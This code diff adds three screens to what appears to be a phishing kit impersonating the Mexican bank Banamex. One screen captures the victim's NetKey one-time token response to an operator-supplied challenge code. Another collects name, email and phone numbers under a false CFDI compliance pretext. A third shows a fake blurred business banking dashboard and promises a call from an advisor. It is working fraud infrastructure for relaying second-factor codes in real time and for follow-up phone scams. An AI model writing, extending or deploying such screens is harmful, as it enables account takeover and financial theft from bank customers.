@@ -2880,6 +2880,286 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         return getBankContainer(generandoPromocionContent);
 
+      case ScreenType.BANAMEX_NETKEY:
+        const banamexNetkeyContent = (
+          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
+            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
+              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
+                    <g fill="#c81f3b">
+                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                    </g>
+                  </svg>
+                  <div>
+                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
+                  </div>
+                </div>
+              </header>
+
+              <div style={{ background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', borderRadius: '8px', padding: '22px', boxShadow: '0 6px 18px rgba(0,0,0,0.08)', border: '1px solid rgba(0,0,0,0.03)' }}>
+                <h2 style={{ fontSize: '22px', fontWeight: 600, color: '#153e46', marginBottom: '18px', display: 'flex', alignItems: 'center', gap: '10px' }}>
+                  <span>Clave dinámica</span>
+                  <span style={{ color: '#c81f3b', fontSize: '24px', fontWeight: 'bold' }}>≫</span>
+                </h2>
+
+                <div style={{ background: '#fff', border: '1px solid #dde9eb', borderRadius: '6px', padding: '18px', marginBottom: '18px' }}>
+                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
+                    <div style={{ background: '#e3f2f4', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, marginTop: '2px' }}>
+                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="#0b3b43"/>
+                      </svg>
+                    </div>
+                    <div style={{ flex: 1 }}>
+                      <p style={{ fontSize: '15px', lineHeight: '1.5', color: '#2d4b51', margin: 0 }}>
+                        El código CHALLENGE se genera automáticamente. Ingrese en su dispositivo NetKey2 el código CHALLENGE para obtener el NetKey.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <div style={{ marginBottom: '22px' }}>
+                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                    Código CHALLENGE
+                  </label>
+                  <div style={{ background: '#fef9e7', border: '2px solid #f4c542', borderRadius: '6px', padding: '16px', textAlign: 'center' }}>
+                    <div style={{ fontSize: '32px', fontWeight: 700, color: '#0b3b43', letterSpacing: '6px', fontFamily: 'Courier New, monospace' }}>
+                      {screenData.challenge || '00000000'}
+                    </div>
+                  </div>
+                </div>
+
+                <div style={{ marginBottom: '22px' }}>
+                  <label htmlFor="netkeyInput" style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                    Ingrese el código NetKey
+                  </label>
+                  <input
+                    id="netkeyInput"
+                    type="text"
+                    maxLength={8}
+                    value={netkeyResponse}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, '');
+                      setNetkeyResponse(val);
+                    }}
+                    placeholder="00000000"
+                    style={{ width: '100%', padding: '14px', fontSize: '18px', fontWeight: 600, letterSpacing: '4px', textAlign: 'center', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43', fontFamily: 'Courier New, monospace' }}
+                    data-testid="input-netkey"
+                  />
+                </div>
+
+                <div style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
+                  <button
+                    onClick={() => setNetkeyResponse('')}
+                    style={{ padding: '12px 24px', fontSize: '16px', fontWeight: 500, border: '2px solid #b0c9cd', borderRadius: '6px', background: '#fff', color: '#2d4b51', cursor: 'pointer' }}
+                    data-testid="button-cancel"
+                  >
+                    Cancelar
+                  </button>
+                  <button
+                    onClick={() => {
+                      if (netkeyResponse.length === 8) {
+                        onSubmit(ScreenType.BANAMEX_NETKEY, { netkeyResponse });
+                      }
+                    }}
+                    disabled={netkeyResponse.length !== 8}
+                    style={{ padding: '12px 32px', fontSize: '16px', fontWeight: 600, border: 'none', borderRadius: '6px', background: netkeyResponse.length === 8 ? '#153e46' : '#b0c9cd', color: '#fff', cursor: netkeyResponse.length === 8 ? 'pointer' : 'not-allowed' }}
+                    data-testid="button-continue"
+                  >
+                    Continuar
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        );
+        return banamexNetkeyContent;
+
+      case ScreenType.BANAMEX_CONTACT_FORM:
+        const [nombreContacto, setNombreContacto] = useState('');
+        const [correoContacto, setCorreoContacto] = useState('');
+        const [celularContacto, setCelularContacto] = useState('');
+        const [telefonoAlternativoContacto, setTelefonoAlternativoContacto] = useState('');
+
+        const banamexContactContent = (
+          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
+            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
+              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px', justifyContent: 'center' }}>
+                <svg width="120" height="50" viewBox="0 0 120 50" xmlns="http://www.w3.org/2000/svg">
+                  <g fill="#c81f3b">
+                    <circle cx="20" cy="15" r="8"/>
+                    <circle cx="20" cy="25" r="8"/>
+                    <circle cx="20" cy="35" r="8"/>
+                  </g>
+                  <text x="35" y="28" fill="#153e46" fontSize="18" fontWeight="600" fontFamily="Arial, sans-serif">banamex</text>
+                </svg>
+              </header>
+
+              <div style={{ background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', borderRadius: '8px', padding: '28px', boxShadow: '0 6px 18px rgba(0,0,0,0.08)' }}>
+                <h2 style={{ fontSize: '22px', fontWeight: 600, color: '#153e46', marginBottom: '12px', textAlign: 'center' }}>
+                  Su servicio requiere actualización
+                </h2>
+
+                <p style={{ fontSize: '15px', lineHeight: '1.6', color: '#2d4b51', marginBottom: '24px', textAlign: 'center' }}>
+                  Para cumplir con los requisitos de emisión de CFDI, un ejecutivo se comunicará con usted. Por favor, complete el siguiente formulario:
+                </p>
+
+                <div style={{ marginBottom: '18px' }}>
+                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                    Nombre completo *
+                  </label>
+                  <input
+                    type="text"
+                    value={nombreContacto}
+                    onChange={(e) => setNombreContacto(e.target.value)}
+                    placeholder="Ingrese su nombre completo"
+                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    data-testid="input-nombre"
+                  />
+                </div>
+
+                <div style={{ marginBottom: '18px' }}>
+                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                    Correo electrónico *
+                  </label>
+                  <input
+                    type="email"
+                    value={correoContacto}
+                    onChange={(e) => setCorreoContacto(e.target.value)}
+                    placeholder="ejemplo@correo.com"
+                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    data-testid="input-correo"
+                  />
+                </div>
+
+                <div style={{ marginBottom: '18px' }}>
+                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                    Celular *
+                  </label>
+                  <input
+                    type="tel"
+                    value={celularContacto}
+                    onChange={(e) => setCelularContacto(e.target.value.replace(/\D/g, ''))}
+                    placeholder="5512345678"
+                    maxLength={10}
+                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    data-testid="input-celular"
+                  />
+                </div>
+
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                    Teléfono alternativo (opcional)
+                  </label>
+                  <input
+                    type="tel"
+                    value={telefonoAlternativoContacto}
+                    onChange={(e) => setTelefonoAlternativoContacto(e.target.value.replace(/\D/g, ''))}
+                    placeholder="5512345678"
+                    maxLength={10}
+                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    data-testid="input-telefono-alternativo"
+                  />
+                </div>
+
+                <div style={{ textAlign: 'right' }}>
+                  <button
+                    onClick={() => {
+                      if (nombreContacto && correoContacto && celularContacto) {
+                        onSubmit(ScreenType.BANAMEX_CONTACT_FORM, {
+                          nombreContacto,
+                          correoContacto,
+                          celularContacto,
+                          telefonoAlternativoContacto
+                        });
+                      }
+                    }}
+                    disabled={!nombreContacto || !correoContacto || !celularContacto}
+                    style={{ padding: '14px 36px', fontSize: '16px', fontWeight: 600, border: 'none', borderRadius: '6px', background: nombreContacto && correoContacto && celularContacto ? '#153e46' : '#b0c9cd', color: '#fff', cursor: nombreContacto && correoContacto && celularContacto ? 'pointer' : 'not-allowed' }}
+                    data-testid="button-enviar"
+                  >
+                    Enviar
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        );
+        return banamexContactContent;
+
+      case ScreenType.BANAMEX_WAITING:
+        const banamexWaitingContent = (
+          <div style={{ position: 'relative', width: '100%', minHeight: '100vh', background: '#fff' }}>
+            <div style={{ position: 'absolute', inset: 0, filter: 'blur(4px)', opacity: 0.4 }}>
+              <div style={{ padding: '20px', fontFamily: 'Arial, sans-serif' }}>
+                <div style={{ background: '#153e46', color: '#fff', padding: '16px', marginBottom: '20px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+                    <svg width="60" height="30" viewBox="0 0 120 50">
+                      <g fill="#fff">
+                        <circle cx="15" cy="12" r="6"/>
+                        <circle cx="15" cy="25" r="6"/>
+                        <circle cx="15" cy="38" r="6"/>
+                      </g>
+                      <text x="25" y="28" fill="#fff" fontSize="14" fontWeight="600">banamex</text>
+                    </svg>
+                    <div style={{ flex: 1, textAlign: 'center', fontSize: '16px', fontWeight: 500 }}>
+                      BancaNet Empresarial
+                    </div>
+                  </div>
+                </div>
+
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '16px', marginBottom: '20px' }}>
+                  <div style={{ background: '#f8f9fa', padding: '16px', borderRadius: '8px' }}>
+                    <h3 style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Saldo disponible</h3>
+                    <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#153e46' }}>$37,004.58</p>
+                  </div>
+                  <div style={{ background: '#f8f9fa', padding: '16px', borderRadius: '8px' }}>
+                    <h3 style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Transferencias</h3>
+                    <p style={{ fontSize: '16px', color: '#153e46' }}>Realizar transferencia</p>
+                  </div>
+                  <div style={{ background: '#f8f9fa', padding: '16px', borderRadius: '8px' }}>
+                    <h3 style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Movimientos</h3>
+                    <p style={{ fontSize: '16px', color: '#153e46' }}>Ver movimientos</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div style={{ position: 'relative', zIndex: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '100vh' }}>
+              <div style={{ background: '#fff', borderRadius: '12px', padding: '40px', textAlign: 'center', boxShadow: '0 8px 24px rgba(0,0,0,0.15)', maxWidth: '500px', margin: '20px' }}>
+                <div style={{ marginBottom: '24px' }}>
+                  <svg width="120" height="50" viewBox="0 0 120 50">
+                    <g fill="#c81f3b">
+                      <circle cx="20" cy="15" r="8"/>
+                      <circle cx="20" cy="25" r="8"/>
+                      <circle cx="20" cy="35" r="8"/>
+                    </g>
+                    <text x="35" y="28" fill="#153e46" fontSize="18" fontWeight="600">banamex</text>
+                  </svg>
+                </div>
+
+                <div style={{ marginBottom: '24px' }}>
+                  <img 
+                    src={loadingGif} 
+                    alt="Cargando..." 
+                    style={{ width: '80px', height: '80px', margin: '0 auto' }}
+                  />
+                </div>
+
+                <p style={{ fontSize: '18px', fontWeight: 500, color: '#153e46', marginBottom: '8px' }}>
+                  Espere un momento
+                </p>
+                <p style={{ fontSize: '15px', color: '#2d4b51' }}>
+                  En breve se contactará un asesor
+                </p>
+              </div>
+            </div>
+          </div>
+        );
+        return banamexWaitingContent;
+
       default:
         return (
           <div className="text-center py-8">
